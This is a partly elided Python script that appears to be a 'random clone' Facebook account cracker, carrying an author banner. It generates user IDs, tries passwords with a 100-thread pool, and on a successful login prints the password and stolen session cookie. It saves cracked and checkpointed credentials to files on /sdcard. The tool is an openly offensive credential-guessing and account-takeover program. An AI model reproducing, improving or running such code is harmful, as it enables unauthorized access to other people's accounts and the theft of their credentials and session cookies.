...
\033[1;32m==================================================
          Author     : JUBAYER CAYBAR
          Telegram   : The_Monster_401          
          Facebook   : JUBAYER.401
          Github     : JUBAYER-404   
          Version    : \033[1;96mRANDOM CLONE \033[1;31m[FREE•3]\x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         🍂  JUBAYER CAYBAR IS A BRAND 🥰          \x1b[0m
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def JUBAYER():
    ...
    print(f"\033[1;31m===================")
    print("")
    JUBAYER = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if JUBAYER in ["1"]:
        main()
    if JUBAYER in ["2"]:
        os.system('exit')
def main():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as JUBAYER:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        ...
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;31mFILE SAVE IN /sdcard/JUBAYER-OK🥰.txt")
        print('\033[1;32m='*50)
        for guru in user:
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[1;33m[JUBAYER-OK🥰] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [😜] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                os.system("espeak \"JUBAYER, OK, ID \"")
                open('/sdcard/JUBAYER-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[JUBAYER-CP😔] \033[1;31m{uid} • {ps}")
                os.system("espeak \"JUBAYER, CP, ID \"")
                open('/sdcard/JUBAYER-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
